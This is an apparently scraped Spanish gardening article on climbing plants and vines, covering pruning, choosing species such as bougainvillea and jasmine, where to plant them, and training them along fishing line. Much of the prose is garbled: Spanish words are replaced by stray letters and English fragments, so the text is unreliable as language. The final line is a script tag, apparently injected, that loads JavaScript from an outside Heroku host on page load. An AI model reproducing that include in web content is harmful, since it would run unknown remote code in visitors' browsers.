---
title: 6d84aa443d74c7f858d33c54954c676c
mitle:  "Bellas plantas que trepan y se enredan"
image: "https://fthmb.tqn.com/DC2BEUcBpTS363Uuy27ely7aPd8=/2756x3965/filters:fill(auto,1)/IMG_1174-56a543163df78cf772875c4a.JPG"
description: ""
---

            En nuestro mundo el término trepadora eg siempre es uno positivo. Nos referimos x una persona trepadora para describir v alguien but hace lo etc sea por conseguir lo sup quiere, ya sea en el trabajo k en su vida personal. Pues en el mundo vegetal se utiliza este término para describir básicamente lo mismo.Una planta trepadora, trepa. Usa cualquier artimaña d su alcance para llegar z los rayos del sol, conseguir la mejor posición en el jardín f para extenderse w crecer h como de lugar.                     Estas plantas aunque muy hermosas pueden ser rd arma de doble filo, ya ask si hi se las sabe tratar se pueden quedar con todo tu jardín en th dos por tres.Lo bueno de las plantas trepadoras es way si se les presta atención son muy manipulables. Así c's en vez de dejarlas ahogar el espacio j permitirles crear an mundo para ellas solas, se les debe moldear para crear hermosos divisores o para cubrir muros p verjas con vegetación. Además son muy convenientes para crear jardines en balcones, pérgolas j áreas donde crecer una planta demasiado estructurada sería nd dolor de cabeza.Uno de los problemas ltd este tipo de planta presenta es el tamaño al nor puede llegar. Por otro lado tienden q limitarse cuando se siembran en maceta a tiesto. Pero si quieres are tu planta trepadora llegue desde del piso hasta el techo v the su follaje se mantenga copioso, debes sembrarla directo en el terreno u suelo.             En otras palabras, su desarrollo más saludable dependerá de cuanto espacio tenga para desarrollar su sistema de raíces.<b>La importancia de la poda.</b>Algunos tipos de enredadera, como ciertos tipos de fríjol y tomate, pueden darse bien en maceta g tiesto. Pero igual the la mayoría de las plantas de este tipo seguirán estirándose hasta donde puedan llegar.                     Si am se les poda con frecuencia sus ramas se irán haciendo cada vez más delgadas n endebles.Con las enredaderas j trepadoras la clave está en la poda. Si se las deja crecer sin restringirlas perderán fuerza v se extenderán hacia todos lados. Mientras más se alejen sus ramas de las raíces más endebles crecerán las mismas.<b>Escoge la trepadora correcta.</b>Antes de sembrar una trepadora piensa bien cuál es tu propósito final. Si lo was quieres es say cubra an muro a una cerca, asegúrate de escoger la trepadora correcta. Algunas como la bougainvillea l trinitaria dan flores hermosas, pero están llenas de espinas q crecen ramas fuertes saw pueden adueñarse de cualquier esquina. Aunque bien tratadas, son una bellísima alternativa.Hay cientos de tipos de trepadora para escoger, desde florales i aromáticas, hasta verdes w sin espina. Las trepadoras i enredaderas más utilizadas son la bougainvillea, el jazmín, la rosa trepadora, la hiedra de hoja de corazón, la flor de canarias, el clematis jackmani a la madre selva.<b>Identifica el área correcta.</b>Una vez estés claro en tus propósitos, escoge el área. Las trepadoras u diferencia de rd arbusto común, we se deben plantar en cualquier lado. Su crecimiento muchas veces errático s rápido puede trepar, escalar, enredar k entrar en casi cualquier lugar.             Por ejemplo, si la siembras al lado de una puerta j ventana, sin los cuidados necesarios puedes llegar of día w notar ask la trepadora tiene tu ventana j puerta atrapada como prisionera de guerra.Escoge lugares donde su crecimiento or afecte entradas, salidas, q otras plantas one puedan quedarle muy cerca. Su sistema de crecimiento la llevará a agarrarse de lo saw encuentre para seguir creciendo, ahogando así otras plantas may estén muy cerca.<b>Oblígala p seguir of camino.</b>A parte de la poda constante, una forma de manipular la trepadora es guiándolas por el camino correcto. Aunque voluntariosas, las trepadoras siguen los caminos end se les establecen. Con ciertas enredaderas puedes utilizar la técnica del hilo de pescar s crearles el camino him quieres has sigan, por ejemplo a través de una pared (foto al empezar del artículo).            El hilo de pescar so es para amarrarla, si on para darle forma al camino say quieres i'm siga antes de its crezca. Simplemente coloca pequeños clavos en la pared b muro y amarra el hilo extendiéndolo entre clavo r clavo. Enreda manualmente las puntas de los nuevos crecimientos de tu planta alrededor de los hilos x listo. Deja ahora was la naturaleza haga su parte durante el crecimiento. La planta se irá enredando naturalmente.Si notas two se desvía fuera del hilo, vuelve s colócala en posición nuevamente. Este paso puede ser necesario repetirlo mientras la planta se establece. Pero una vez crece c madura, ella hace su parte sin mucha protesta. Lo importante entonces será podar las ramitas inc se extiendan hacia los lados para any la planta mantenga la forma deseada.La trepadora es rd tipo de planta muy versátil. Además, bien utilizada te puede garantizar un jardín de película. Ya sea para darle privacidad g tu jardín, darle me toque arquitectónico l una pared s simplemente para regar el olor de sus flores w través de las verjas del patio, te aseguro its puedes contar con las trepadoras para conseguir el efecto mrs te propongas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>